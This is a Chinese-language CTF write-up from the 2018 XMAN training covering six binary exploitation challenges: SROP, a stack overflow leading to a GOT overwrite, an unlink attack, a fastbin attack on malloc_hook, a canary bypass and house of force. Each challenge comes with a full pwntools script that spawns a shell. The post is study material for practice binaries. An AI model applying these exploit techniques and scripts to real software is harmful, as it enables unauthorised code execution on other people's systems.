---
title: xman pwn 部分wp
date: 2018-08-13 00:00:00
categories:
- CTF/Pwn
tags:  Pwn
---
##smallest
```
    start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
    .text:00000000004000B0                 xor     rax, rax
    .text:00000000004000B3                 mov     edx, 400h       ; count
    .text:00000000004000B8                 mov     rsi, rsp        ; buf
    .text:00000000004000BB                 mov     rdi, rax        ; fd
    .text:00000000004000BE                 syscall                 ; LINUX - sys_read
    .text:00000000004000C0                 retn
    .text:00000000004000C0 start           endp
```
考察的是srop
原理：
https://bestwing.me/2017/03/20/stack-overflow-three-SROP/
这里声明一个点，syscall和signal是两回事，syscall是指令，signal是一段函数，signal调用syscall而且封装context压栈，而syscall只会跳转执行系统函数，不会进行压栈，要区分好这个概念（我在这里混淆了两个概念卡了一晚上，一度怀疑自己智商）
sigreturn是一段指令，有弹栈操作。
基本知识就这样。
srop执行需要几个条件，分别是
第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；
第二，需要知道栈的地址（比如需要知道自己构造的字符串/bin/sh的地址）；
第三，需要知道syscall指令在内存中的地址；
第四，需要知道sigreturn系统调用的内存地址。

在这里，第一个条件不用说，程序明显存在栈溢出漏洞（read），第三个条件syscall的指令在代码段有很清晰地呈现，第四个条件我们可以控制ax寄存器的值从而通过syscall来调用sigreturn。
那么第二个条件显然目前还不满足，但是我们可以通过泄露从而得到栈地址。
在64位系统下的调用约定是：
RAX-SYSCALl号,RDI,RSI,RDX,RCX,R8,R9
我们可以通过将rax的值设置为1，rdi值设置为1从而调用write系统调用把我们想泄露的地址打印在屏幕上
所以构造
payload：
```
    payload = proc_addr * 3
```
程序read到我们输入的字符串后，栈顶为三个程序开始地址，这样调用完read后又会返回到主程序，这时输入‘\xd3’,将程序原入口地址改为原入口地址加三，这样就跳过了xor ax，ax指令，且执行后read函数返回值为字符串长度1，这样我们就可以调用write系统调用从而将地址打印在屏幕上。
执行完write函数后我们又回到了主程序，这时我们就需要构造context而后执行sigreturn从而控制程序流程。
sigreturn系统调用号为15，所以大概思路是利用read函数控制ax寄存器而后进行syscall执行sigreturn。
但是要是想通过一次性达到同时满足控制eax值为15且执行execv（/bin/sh）是不现实的，所以需要两次构造context
第一次构造将程序返回至原程序入口，之后将我们控制的栈地址等信息写入context进而传入read函数，为下一步getshell做准备
第二次发送15字节的字符串，返回地址设置为syscall ret，调用sysreturn，将context内容加载
加载之后构造下一context，将执行getshell的运行条件写入context，返回地址设置为程序入口地址，而后将'/bin/sh'字符串写入预先设定好的位置，发送payload，之后再次发送syscall ret地址将返回地址设置为syscall ret同时将字符长度设置为15再次调用sysreturn加载构造好的context，执行execv('/bin/sh')getshell
exp(wiki)：```
```python
    from pwn import *
    small = ELF('./smallest')
    sh = process('./smallest')
    context.arch = 'amd64'
    context.log_level = 'debug'
    syscall_ret = 0x00000000004000BE
    start_addr = 0x00000000004000B0
      
    payload = p64(start_addr) * 3
    sh.send(payload)


    sh.send('\xb3')
    stack_addr = u64(sh.recv()[8:16])
    log.success('leak stack addr :' + hex(stack_addr))


    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_read
    sigframe.rdi = 0
    sigframe.rsi = stack_addr
    sigframe.rdx = 0x400
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    payload = p64(start_addr) + 'a' * 8 + str(sigframe)
    sh.send(payload)


    sigreturn = p64(syscall_ret) + 'b' * 7
    sh.send(sigreturn)


    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_execve
    sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
    sigframe.rsi = 0x0
    sigframe.rdx = 0x0
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    
    frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
    print len(frame_payload)
    payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
    sh.send(payload)
    sh.send(sigreturn)
    sh.interactive()
```
##note
经典的表单题目，丢进ida查看反编译代码：
```
    void __fastcall main(__int64 a1, char **a2, char **a3)
    {
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      alarm(0x3Cu);                                 // name adr in bss
      puts("Input your name:");                     // faze size 
      get_input((char *)&name, 64, 10);             // no off by one
      puts("Input your address:");
      get_input((char *)&addr, 96, 10);
      while ( 1 )
      {
        switch ( choices() )
        {
          case 1:
            add();                                  // nothing
            break;
          case 2:
            show();
            break;
          case 3:
            edit();                                 // suspect
            break;
          case 4:
            delete();                               // ptr has been nullified
            break;
          case 5:
            puts("Bye~");
            exit(0);
            return;
          case 6:
            exit(0);
            return;
          default:
            continue;
        }
      }
    }
```
漏洞点在于edit函数：
```
      strncat(&dest, addr_of_new_chunk + 15, 0xFFFFFFFFFFFFFFFFLL);// buffer overflow
      strcpy(ori_chunk_addr, &dest);
      free(addr_of_new_chunk);
```
可以看到在对dest进行strncat函数时，字符个数为FFFFFF，再次运行strcpy时会导致栈溢出，从而控制栈中参数
查看当前函数堆栈：
```
00000000000000D0 dest            dq ?                    ; offset
.
.
.
-0000000000000050 addr_of_new_chunk dq ?
```
这里可以看到，dest与addr_of_new_chunk的栈内地址相差0x80，我们可以对此地址进行控制，而后调用free函数再次申请则可以实现对目标地址的读写。
下一步我们要考虑伪造堆块，我们现在想要改写的地址是atoi函数的got表信息将其替换成system，atoi函数的地址可以查询（ida），于是我们考虑在存储堆地址信息的数组中构造堆块
（在这里为什么不直接写got表的原因是在got表附近我们不能直接构造出伪造的堆块，再次申请不能确定能够申请到伪造堆块进行改写）
存储信息的数组存储在bss段，在程序的开头我们可以发现在输入名字和地址时两者的信息存储在bss段，ida查看可知一下结构关系：
```
.bss:00000000006020E0 name            db    ? ;    
.
.
.
.bss:0000000000602120 ; char *base_of_heap_addr_list
```
于是我们可以构造大小为 0x30*padding+fake_chunk_head这样的名字来构造伪造堆块，并且在address处写入伪造的堆块头，绕过检查
这样再次申请内存就可以改写堆的地址，从而改写got表进而执行shell
exp：
```python
    from pwn import *
    context.log_level = 'debug'
    p=process('./note')
    libc=ELF('/libc.so.6')
    
    def newnote(length,x):
        p.recvuntil('--->>')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(str(length))
        p.recvuntil(':')
        p.sendline(x)
    
    def editnote_append(id,x):
        p.recvuntil('--->>')
        p.sendline('3')
        p.recvuntil('id')
        p.sendline(str(id))
        p.recvuntil('append')
        p.sendline('2')
        p.recvuntil(':')
        p.sendline(x)
    
    def editnote_overwrite(id,x):
        p.recvuntil('--->>')
        p.sendline('3')
        p.recvuntil('id')
        p.sendline(str(id))
        p.recvuntil('append')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(x)
    
    def shownote(id):
        p.recvuntil('--->>')
        p.sendline('2')
        p.recvuntil('id')
        p.sendline(str(id))


    p.recvuntil('name:')
    p.sendline('A'*0x30+p64(0)+p64(0x70))
    p.recvuntil('address:')
    p.sendline(p64(0)+p64(0x70))
    newnote(0x80,0x60*'B')
    editnote_append(0,'C'*0x20+p64(0x602120))#ptr_addr
    atoi_got = 0x602088
    newnote(0x60,p64(atoi_got))
    gdb.attach(p)
    shownote(0)
    p.recvuntil('is ')
    atoi_addr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
    atoi_libc=libc.symbols['atoi']
    sys_libc=libc.symbols['system']
    system=atoi_addr-atoi_libc+sys_libc
    print "system="+hex(system)
    
    editnote_overwrite(0,p64(system))
    p.recvuntil('--->>')
    p.sendline('/bin/sh')
    p.interactive()
```
##freenote
```
    _QWORD *init_env()
    {
      _QWORD *ori_large_chunk; // rax
      _QWORD *result; // rax
      signed int i; // [rsp+Ch] [rbp-4h]
    
      ori_large_chunk = malloc(0x1810uLL);
      addr_of_ori_lc = (__int64)ori_large_chunk;
      *ori_large_chunk = 0x100LL;                   // max
      result = (_QWORD *)addr_of_ori_lc;
      *(_QWORD *)(addr_of_ori_lc + 8) = 0LL;        // count
      for ( i = 0; i <= 255; ++i )
      {
        *(_QWORD *)(addr_of_ori_lc + 24LL * i + 16) = 0LL;// used
        // len
        *(_QWORD *)(addr_of_ori_lc + 24LL * i + 24) = 0LL;
        result = (_QWORD *)(addr_of_ori_lc + 24LL * i + 32);// addr
        *result = 0LL;
      }
      return result;
    }
```
程序在执行时，首先执行此函数，申请了一个0x1810大小的堆块，用于保存后续的堆栈信息，各个字段的意义都注释标明
主要的漏洞函数是delete函数：
```
    int delete()
    {
      int v1; // [rsp+Ch] [rbp-4h]
    
      if ( *(_QWORD *)(addr_of_ori_lc + 8) <= 0LL )
        return puts("No notes yet.");
      printf("Note number: ");
      v1 = get_input();
      if ( v1 < 0 || (signed __int64)v1 >= *(_QWORD *)addr_of_ori_lc )
        return puts("Invalid number!");
      --*(_QWORD *)(addr_of_ori_lc + 8);
      *(_QWORD *)(addr_of_ori_lc + 24LL * v1 + 16) = 0LL;
      *(_QWORD *)(addr_of_ori_lc + 24LL * v1 + 24) = 0LL;
      free(*(void **)(addr_of_ori_lc + 24LL * v1 + 32));// ptr not nullified
      return puts("Done.");
    }
```
可以看到free指针后没有将指针信息清零，这就为后续的unlink提供了利用条件
第二个漏洞函数：
```
    __int64 __fastcall leak_function(__int64 a1, signed int a2)
    {
      signed int i; // [rsp+18h] [rbp-8h]
      int v4; // [rsp+1Ch] [rbp-4h]
    
      if ( a2 <= 0 )
        return 0LL;
      for ( i = 0; i < a2; i += v4 )
      {
        v4 = read(0, (void *)(a1 + i), a2 - i);
        if ( v4 <= 0 )
          break;
      }                                             // no \x00 appended
                                                    // 
      return (unsigned int)i;
    }
```
可以看到没有在输入字符串结尾添加\x00，可以泄露地址或者其他信息
第一步-leakaddr：
申请两个堆块，free掉第二个，这时此块被分配到了unsortedbin之中，他的fd，bk指针指向的是main_arena的unsortedbin头部地址，这样再次申请一个堆块，使其内容将fd指针信息覆盖，调用show则可以泄露出地址，进而通过计算算出libc基地址
这里可以leak出main_arena+88的地址，我们在gdb调试时输入vmmap就可以查看到libc地址，（后缀名为libc且权限是可读可执行，start地址），把泄露出的地址相减就可以得到偏移
这里申请两个堆块的原因是如果申请一个堆块的话free之后会被topchunk合并。
第二步-泄露heap基地址
同样的，我们申请四个堆块，free掉不相邻的两个堆块（0和2），这时由于unsortedbin是双向链表，他们的fd，bk指针就分别存储着以下信息
0：fd->unsorted_bin_head bk->chunk_2_addr
2:bk->unsorted_bin_head fd->chunk_0_addr
与上一步同样的套路，泄露出heap地址

第三步-unlink
首先申请三个堆块而后free掉，这样就在保存堆信息的结构体数组中保留了指针，而后构造伪造堆块payload
p64(0)+p64(0x81)+fd+bk+padding(len = 0x80-0x20)+
p64(0x80)+p64(0x90)+padding(0x80)+
p64(0)+p64(0x91)+padding(0x80)
即在第一个堆块内伪造一个小于原第一堆块的fake块，其大小为原堆块减去头部的大小，且将preinuse位置1，在其中加入fd，bk
第二个堆块伪造成正在使用的堆块，preinuse位值0
第三个堆块的preinuse位置1
这样就保证了在结构体数组中的堆块指针指向我们伪造的第二个堆块，调用free函数free掉第二个堆块就会触发unlink函数
在这里
fd = victim - 0x18
bk = victim - 0x10
这样执行unlink之后就会使
victim---->fd
即victim指针指向的地址的值为fd即victim-0x18，进而达到修改其自身的效果
我们指定的victim是chunk0，由于我们已经得到了heap地址，经过计算就可以得到fd和bk的值
之后调用edit函数，修改chunk0，由于chunk0指针已经被修改，所以其实就是修改结构体数组中的数据，即我们可以读或者写的地址
构造的payload为：
count（0<count<max)+flag+len+got_free+padding(len 0x10)+binsh_addr
这样我们就可以修改free_got的地址，再次调用edit，将got表改写成system地址，执行free（1）操作，即free(binsh_addr)->system(binsh_addr)->system(binsh)即可getshell
```python
    from pwn import *
    context.log_level = 'debug'
    io = process('./freenote')
    elf = ELF('freenote')
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def show(idx):
    	io.recvuntil('choice: ')
    	io.sendline('1')
    
    	io.sendline(str(idx))
    def add(len,content):
    	io.recvuntil(':')
    	io.sendline('2')
    	io.recvuntil('note:')
    	io.sendline(str(len))
    	io.recvuntil(':')
    	io.sendline(content)
    def delete(idx):
    	io.recvuntil(':')
    	io.sendline('4')
    	io.recvuntil('number:')
    	io.sendline(str(idx))
    def edit(idx,len,content):
    	io.recvuntil(':')
    	io.sendline('3')
    	io.recvuntil('number:')
    	io.sendline(str(idx))
    	io.recvuntil(':')
    	io.sendline(str(len))
    	io.recvuntil(':')
    	io.sendline(content)
    
    add(0x80,'A'*0x80)
    add(0x80,'B'*0x80)
    delete(0)
    add(0x8,'A'*0x8)
    show(0)
    io.recvuntil("0. ")
    leak = io.recvuntil("\n")
    print type(leak)
    print leak[8:-1].encode('hex')
    leaklibcaddr = u64(leak[8:-1].ljust(8, '\x00'))
    print hex(leaklibcaddr)
    
    delete(1)
    delete(0)
    magic_num = 0x3c4b78
    libc_base = leaklibcaddr - magic_num
    system_addr = libc_base+libc.symbols['system']
    binsh = libc_base + next(libc.search('/bin/sh'))
    
    add(0x80,"A"*0x80)
    add(0x80,'B'*0x80)
    add(0x80,'C'*0x80)
    add(0x80,'D'*0x80)
    delete(2)
    delete(0)
    
    add(0x8,'A'*8)
    gdb.attach(io)
    show(0)
    io.recvuntil("0. ")
    leak = io.recvuntil("\n")
    print type(leak)
    print leak
    print leak[8:-1].encode('hex')
    leak_heap= u64(leak[8:-1].ljust(8, '\x00'))
    print leak_heap


    delete(0)
    delete(1)
    delete(3)
    #gdb.attach(io)
    
    fd = leak_heap - 0x1808 
    bk = fd + 0x8
    
    add(0x80,'A'*0x80)
    add(0x80,'B'*0x80)
    add(0x80,'C'*0x80)
    
    delete(2)
    delete(1)
    delete(0)
    
    notelen = 0x80
    free_got = 0x602018


    payload  = ""
    payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
    payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
    payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)
    
    add(len(payload),payload)
    delete(1)
    
    payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh)
    payload2 += "A"* (notelen*3-len(payload2)) 
    
    edit(0,len(payload2),payload2)
    gdb.attach(io)
    edit(0,0x8,p64(system_addr))
    gdb.attach(io)
    delete(1)
    io.interactive()
```

##offbyone
标准的表单输入程序，漏洞点在edit函数：
```
    unsigned __int64 edit()
    {
      __int64 idx; // [rsp-18h] [rbp-18h]
      unsigned __int64 v2; // [rsp-10h] [rbp-10h]
    
      v2 = __readfsqword(0x28u);
      printf("index: ");
      __isoc99_scanf("%d", &idx);
      if ( (signed int)idx >= 0 && (signed int)idx <= 15 && addr_list[(signed int)idx] )
      {
        puts("your note:");
        HIDWORD(idx) = strlen(addr_list[(signed int)idx]);
        read(0, (void *)addr_list[(signed int)idx], SHIDWORD(idx));
        puts("done.");
      }
      else
      {
        puts("invalid index.");
      }
      return __readfsqword(0x28u) ^ v2;
    }
```
strlen在读取字符串长度时以0作为结尾，在读取时会将下一堆块的头部结尾字段当作字符读取，造成了一个字节的溢出
思路大概就是leak地址，overlap堆块，改写函数地址，getshell
首先申请4个堆块，除了第二个堆块外其他堆块都要在fastbin大小范围内，为后续的fastbinattack做准备
由于我们要利用offbyone来进行对头部size字段的改写，那么我们要实施攻击的目标块附近堆块申请的堆块大小应该是形如0x x8的，这样才能对下一个堆块的presize位进行复用，进而offbyone修改size位
申请的堆块布局如下

    0x28(实际堆块大小  0x30）
    0xf8             0x100
    0x68             0x70
    0x60             0x70
    0x60             0x70

这样我们free掉1块，被放入unsortedbin中，通过修改0块内容溢出字节修改1号堆块size大小为171，再通过修改2号堆块内容将3号堆块的头部presize字段修改为0x170，size字段不变
这样我们申请一个大小为0xf8大小的堆块时系统会将unsortedbin中的1号块分割（因为我们已经把其大小改成了0x170，使其覆盖了2号堆块，三号堆块的头部信息也同样修改满足bypass检查需求），将原来的1号堆块分配给用户，而将原来的2号堆块（分割后剩余部分）放回unsortedbin中，并且其fdbk指针是main_arena+88这一地址（unsortedbin头部信息）。
这样我们show一下2的话就可以泄露地址了。
这时我们再申请一个大小为0x60的堆块，系统会把2号堆块返回给用户，这样我们就有2号和5号堆块其实是一块内存这一攻击条件。
这时我们需要利用fastbinattack来进行攻击
我们有可以释放后再写入信息的堆块（2、5号堆块），我们先释放3号堆块然后在释放2号堆块，这时fastbin->2->3,而后我们将2号堆块的fd指针改写（因为我们可以对五号堆块读写，而5和2其实是一块堆块），改写成我们想要修改数据的相应位置，这时fastbin->2->victim,而后申请一个堆块没什么用，再次申请堆块即可修改数据。
这里需要指明一点的是，由于在free堆块时相应的指针被清零，所以我们选择了一个比较巧妙地方法：
改写malloc_hook,系统检查堆块时报错函数malloc_printer会调用malloc，而我们在调用malloc时会首先检查malloc\_hook的值，如果有的话就首先调用malloc\_hook,也就是说我们故意的让系统检测到不合法的操作信息使其报错，而后使其调用malloc_hook,我们在mallochook中写入onegadget地址，这样就可以getshell。
exp：
```python
    from pwn import *
    def add(size,note):
    	p.sendlineafter(">> ","1")
    	p.sendlineafter(": ",str(size))
    	p.sendlineafter("note:",note)
    
    def edit(index,note):
    	p.sendlineafter(">> ","2")
    	p.sendlineafter("index: ",str(index))
    	p.sendafter("note:",note)
    
    def delete(index):
    	p.sendlineafter(">> ","3")
    	p.sendlineafter("index: ",str(index))
    
    def show(index):
    	p.sendlineafter(">> ","4")
    	p.sendlineafter("index: ",str(index))


​    
​    
    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc=ELF('libc.so.6')
    #p=process('./offbyone')
    p = remote('202.112.51.184' ,19006)
    
    add(0x28,'A'*0x28)#0
    add(0xf8,'B'*0xf8)#1
    add(0x68,'C'*0x68)#2
    add(0x60,'D'*0x60)#3
    add(0x60,'E'*0x60)#4
    
    #raw_input()
    delete(1)
    edit(0,'A'*0x28+'\x71')
    #gdb.attach(p)
    edit(2,'C'*0x60+p64(0x170)+'\x70') #bypass check
    									#enlarge 1 and set fakehead of 3
    									#make it like 1 and 2 is one chunk
    
    add(0xf8,'F'*0xf8)					#it lays in 1


    show(2)								#2 now in unsorted bin because fake chunk is too large
    									#so it split into two chunk
    main_arena=u64(p.recvline(keepends=False).ljust(8,'\0'))-0x58
    print hex(main_arena)
    
    libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
    print hex(libc_base)
    free_got = libc_base + libc.symbols['free']
    system=libc_base+libc.symbols['system']
    print "system",hex(system)


    malloc_hook=libc_base+libc.symbols['__malloc_hook']


    one_gadget=libc_base+0xf02a4# 0x4647c 0xe9415 0x46428 0xea36d
    #one_gadget=libc_base+0x4647c
    
    add(0x60,'Z'*0x60)#5 == 2		now 2 is used
    
    delete(3)
    					#fastbin:2->3
    delete(2)
    #gdb.attach(p)
    edit(5,p64(malloc_hook-0x10-3)[0:6]) #2->mlhk
    #edit(5,p64(libc.symbols['free'])[0:6])
    add(0x60,'/bin/sh\x00'+'a'*0x58)#2contentchanged


    add(0x60,'a'*0x3+p64(one_gadget))#change malloc hook to onegadget
    #add(0x60,p64(system))
    delete(2)#doublefree call error->mallocprint->mallochook->onegadget->shell
    delete(5)
    
    p.interactive()
```
这里需要注意的是，我们在利用fd指针寻找伪造堆块时，要保证堆块的头部信息也就是size字段要与申请的大小相同，在malloc附近由于未初始化都是0，借助上一个地址的信息我们可以得到我们需要的大小，也就是说我们修改的地址是在malloc_hook - 0x10 -3的位置（可以自己手动调试），libc的版本不同的话我们构造的head大小也不同。
同样需要提及的一点是onegadget需要一些条件的满足，我们需要逐个尝试才能保证其准确性。

##canary
程序开了canary和nx
这道题主要就是考察如何泄露或者改写canary
归根结底就是怎么在内存里面找到canary
```
    pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL);
```
程序在执行时创建了一个线程
创建线程时会把tls保存到栈中，并且canary是在最前边，这样我们就可以将程序返回时canary的值和原本的canaryde值覆盖使其相等，就可以绕过检查
查看canary的方式就是在检查canary的汇编代码地址附近下断点，这样可以在栈里面看到canary的值，而后在内存里查找与其相同的值，将两个值得地址减一下就得到偏移了
exp：
```python
    from pwn import *
    import os
    context.log_level = 'debug'
    #env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6')}#-56d992a0342a67a887b8dcaae381d2cc51205253')}
    #io = remote('202.112.51.184' ,19003)
    io = process('./bs')
    elf = ELF('bs')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('libc.so.6')
    main=0x4009e7
    poprdi=0x400c03
    poprsi=0x400c01
    read=0x4007e0
    atoigot=0x601ff0
    putsgot=0x601fb0
    putplt=0x4007c0
    buf=0x602f00
    leave=0x400955
    p1=p64(poprdi)+p64(putsgot)+p64(putplt)
    p2=p64(poprdi)+p64(0)+p64(poprsi)+p64(buf+0x8)+p64(0)+p64(read)+p64(leave)
    payload=p1+p2
    io.recvuntil("How many bytes do you want to send?")
    io.sendline(str(6128))
    log.success(hex(libc.symbols['puts']))
    io.send("\x00"*4112+p64(buf)+payload+"\x00"*(0x17f0-4120-len(payload)))
    io.recvuntil("It's time to say goodbye.\n")
    libbase=u64(io.recv()[:6]+"\x00\x00")-0x6f690
    print hex(libbase)
    one = 0xf02a4 + libbase
    gdb.attach(io)
    raw_input()
    io.sendline(p64(one))
    io.interactive()
```
##house of force
源程序漏洞很多。。主要是在delete函数，只是把堆块free掉其他的什么也没干：
```
    int delete()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
    
      puts("Please enter the index of the note:");
      v1 = getnum();
      if ( !*((_QWORD *)&len_list + 2 * v1) )
        return puts("There's nothing here!");
      free(ptrlist[2 * v1]);                        // not nullified
                                                    // len still and ptr still
      return puts("Delete completion!");
    }
```
但是这个程序会对输入的字符检查，凡是在libc范围内的地址都会被过滤
```
    signed __int64 __fastcall sub_1052(__int64 a1, unsigned __int64 a2)
    {
      unsigned __int64 v2; // rax
      __int64 v4; // [rsp+18h] [rbp-18h]
      int j; // [rsp+28h] [rbp-8h]
      int i; // [rsp+2Ch] [rbp-4h]
    
      v2 = 8LL;
      if ( a2 <= 8 )
        v2 = a2;
      for ( i = 0; i < v2; ++i )
      {
        v4 = i + a1;
        for ( j = 0; j < (a2 - i + 7) >> 3; ++j )
        {
          if ( *(_QWORD *)(8LL * j + v4) > (unsigned __int64)filtdsk
            && *(_QWORD *)(8LL * j + v4) < (unsigned __int64)qword_2030D8 )
          {
            return 0xFFFFFFFFLL;
          }
        }
      }
      return 0LL;
    }
```
所以不能输入libc内的地址，常规的改写地址的方式行不通
这样就只能实行topchunkattack
主要思路就是通过fastbinattack改写topchunk头部大小（注意要构造bypass条件，如堆块头大小以及当前fastbin是否在其所属大小的链中）
而后
system+free_hook-top_ptr 
之后 malloc(free_hook-top_ptr-0x10)  ,这时肯定会用top chunk进行分配。
则分配过后，新的top chunk的size为
原来的size - 分配掉的size = （system+free_hook-top_ptr) - (free_hook-top_ptr-0x10 +0x10)
= system
新的top chunk指针位于
原top chunk地址 + 分配掉的size = top_ptr + （free_hook-top_ptr-0x10+0x10） = free_hook
这样就在不写入libc地址的情况下在free_hook的地方写入了system地址。
值得注意的一点是：
实际分配的时候还需要考虑到计算size的对齐问题等，所以可以在上面
写入的值附近试一试，保证最后可以在free_hook写入system（实际上是system+1，因为
topchunk的P标志位会被设为1）地址就行。
于是乎需要手动调试或者其他技巧搞到一个符合的组合
exp：
```python
    from pwn import *
    import os
    
    context.log_level = 'debug'
    env = {'LD_PRELOAD':'./libc.so.6'}
    io = process('./pwn2',env=env)
    #io = remote('202.112.51.184',19007)
    elf = ELF('pwn2')
    libc = ELF('/libc.so.6')
    
    def add(size,content):
    	io.recvuntil('>>',timeout = 1)
    	io.sendline('1')
    	io.recvuntil('Please enter the length of the note:',timeout = 1)
    	io.sendline(str(size))
    	io.recvuntil('Please enter the data of the note:',timeout = 1)
    	io.sendline(content)
    def edit(idx,content):
    	io.recvuntil('>>')
    	io.sendline('2')
    	io.recvuntil('Please enter the index of the note:')
    	io.sendline(str(idx))
    	io.recvuntil('Please enter the data of the note:')
    	io.sendline(content)
    def delete(idx):
    	io.recvuntil('>>')
    	io.sendline('3')
    	io.recvuntil('Please enter the index of the note:')
    	io.sendline(str(idx))
    def show():
    	io.recvuntil('>>')
    	io.sendline('4')
    
    add(0x100,'A'*0x100)#0
    add(0x30,"B"*0x30)#1
    delete(0)
    #gdb.attach(io)
    show()
    io.recvuntil('note index 0 : ')
    leak = u64(io.recvuntil('1. allocate note')[0:6]+'\x00\x00')
    print hex(leak)
    libc_base = leak -0x58 - libc.symbols['__malloc_hook']-0x10
    log.success(hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search('/bin/sh'))
    
    add(0x100,'A'*0x100)#2
    add(0x30,'C'*0x30)#3
    add(0x30,'D'*0x30)#4
    add(0x30,'E'*0x30)#5
    delete(3)
    delete(4)
    show()
    io.recvuntil('note index 4 : ')
    leak_heap = u64(io.recvuntil('1. allocate note')[0:6]+'\x00\x00')
    top_addr = leak_heap + 0xc0
    log.success(hex(top_addr))
    fake_size = system_addr+free_hook-top_addr
    log.success(fake_size)
    edit(5,'E'*0x20+p64(0x30)+p64(0x40))
    
    #gdb.attach(io)
    edit(4,p64(top_addr-0x10)+'\n')
    add(0x30,'/bin/sh\x00')#6
    
    add(0x30,p64(0xdeadbeef)+p64(fake_size-1))
    
    #gdb.attach(io)
    
    add(free_hook-top_addr-0x10,'F'*0x10)#7
    
    delete(6)
    #gdb.attach(io)
    io.interactive()
```
